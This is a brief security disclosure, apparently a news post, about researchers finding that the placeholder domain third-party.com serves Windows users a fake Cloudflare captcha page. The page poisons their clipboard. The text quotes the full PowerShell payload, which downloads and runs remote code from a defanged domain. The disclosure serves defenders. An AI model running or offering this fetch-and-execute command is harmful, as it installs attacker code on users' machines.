Manifold Security researchers including Ax Sharma and Swapnil Patil disclosed that third-party.com, a documentation placeholder hardcoded in over 1,500 files across 1,700+ repositories including Chromium, Sanity, and Vercel, serves a fake Cloudflare verification page only to Windows user agents. The page poisons the clipboard with powershell "Write-Host(&{iex(irm('elxxvvx[.]xyz/f'))})2>$null" dressed as a captcha token, while macOS and Linux callers get a harmless "macOS is not supported" decoy. The team reported the domain to registrar Network Solutions before publishing, and BleepingComputer credits this post as the first report.
